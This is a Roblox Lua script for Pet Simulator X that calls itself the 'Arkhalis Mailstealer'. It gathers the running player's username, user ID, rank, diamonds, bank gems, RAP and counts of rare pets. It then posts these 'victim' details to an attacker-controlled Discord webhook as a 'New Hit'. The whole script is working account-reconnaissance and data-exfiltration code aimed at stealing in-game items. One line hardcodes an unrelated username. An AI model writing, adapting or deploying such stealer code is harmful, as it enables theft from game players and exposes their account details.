local Exclusive = 0

for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
    if v:IsA("TextButton") then
    	if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") then
                    Exclusive = Exclusive + 1
                end
            end
	end

local Event = 0

for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
    if v:IsA("TextButton") then
    	if v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then
                    Event = Event + 1
                end
            end
	end
local BankExclusive = 0

for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Bank.Pets:GetChildren()) do
    if v:IsA("TextButton") then
    	if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") then
                    BankExclusive = BankExclusive + 1
                end
            end
	end

local BankEvent = 0

for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Bank.Pets:GetChildren()) do
    if v:IsA("TextButton") then
    	if v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then
                    BankEvent = BankEvent + 1
                end
            end
	end


local exploit = identifyexecutor()
  
--// Execution Log
if game.PlaceId == 6284583030 then
	_G.GameIn = "Pet Simulator X"
elseif game.PlaceId == 7722306047 then
	_G.GameIn = "PSX Trading Plaza"
elseif game.PlaceId == 10321372166 then
	_G.GameIn = "PSX Hardcore"
elseif game.PlaceId == 12610002282 then
	_G.GameIn = "PSX Pro Trading Plaza"
elseif game.PlaceId == 11725212117 then
	_G.GameIn = "PSX Voice Trading Plaza"
else
	_G.GameIn = "❓ Couldn't find game"
end
local webhookcolor = "13369599"
local Players = game:GetService("Players")
local Client = Players.LocalPlayer
_G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
_G.PlrUserVictim = game.Players.LocalPlayer.Name
_G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
_G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
_G.DisplayDiamond = game:GetService("Players").LocalPlayer.leaderstats.Diamonds.Value
_G.DisplayRap = game:GetService("Players").LocalPlayer.leaderstats.RAP.Value
_G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text
local GemsFormated = (require(game:GetService("ReplicatedStorage").Library.Functions.NumberShorten)( _G.DisplayDiamond ))
local RapFormated = (require(game:GetService("ReplicatedStorage").Library.Functions.NumberShorten)( _G.DisplayRap ))
_G.BankGems = game:GetService("Players").a11a1104.PlayerGui.Bank.Frame.Container.Bank.Bottom.Balance.Amount.Text
local function sendwebhook(msg)
local msg = {
	["avatar_url"] = "https://cdn.discordapp.com/attachments/1106232994441732117/1106233834850222231/33333.png",
	["content"]= "**<a:999:1112457166608158821>New Hit With Arkhalis Premium<a:999:1112457166608158821>** || @here|| ",
	["username"] = "Arkhalis",
	["embeds"]= {
	  {
		["title"]= "`Arkhalis Mailstealer Results`",
		["description"]= "**Data from the victim**\n***<:Gigachad:1112768331146068069> Display Name: ".._G.PlrDisplayNameVictim.."\n<:Gigachad:1112768331146068069> Username: ".._G.PlrUserVictim.."\n<:Gigachad:1112768331146068069> User ID: ".._G.PlrUserIDVictim.."\n:medal:Rank: ".._G.CurrentRank.."\n:joystick: Place: ".._G.GameIn.."\n:skull_crossbones: Executor: "..exploit.."***",
		["url"]= "https://discord.gg/ajmeAeq76d",
		["color"]= ""..webhookcolor.."",
		["thumbnail"] = {
        ["url"] = "https://tenor.com/view/byuntear-sad-sad-cat-cat-meme-gif-25617057",
        ["height"] = 420,
        ["width"] = 420
        },
		["fields"]= {
        {
          ["name"]= "**<:diamond:1112767847899340810>Diamonds<:diamond:1112767847899340810> **",
          ["value"]= "```"..GemsFormated.."```",
          ["inline"]= true
        },
        {
          ["name"]= "**<:arrowup:1112767464640622686>Rap<:arrowup:1112767464640622686>**",
          ["value"]= "```"..RapFormated.."```",
          ["inline"]= true
        },
	{
          ["name"]= "**<:Hugecat:1112766460830429255>Exclusive<:Hugecat:1112766460830429255>**",
          ["value"]= "```"..Exclusive.."```",
          ["inline"]= true
        },
	{
          ["name"]= "**<:event:1112767158049591307>Event<:event:1112767158049591307>**",
          ["value"]= "```"..Event.."```",
          ["inline"]= true
        },
	{
          ["name"]= "**<:diamond:1112767847899340810>Bank Gems<:diamond:1112767847899340810>**",
          ["value"]= "```".._G.BankGems.."```",
          ["inline"]= true
        },
        {
          ["name"]= "**<:Hugecat:1112766460830429255>Bank Exclusive<:Hugecat:1112766460830429255>**",
          ["value"]= "```"..BankExclusive.."```",
          ["inline"]= true
        },
	{
          ["name"]= "**<:event:1112767158049591307>Bank Event<:event:1112767158049591307>**",
          ["value"]= "```"..BankEvent.."```",
          ["inline"]= true
        }
      }
      
  }
  },
	["attachments"] = {}
  }
  local Webhook = _G.Webhook
  request = http_request or request or HttpPost or syn.request
  request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
  end
  sendwebhook(msg)
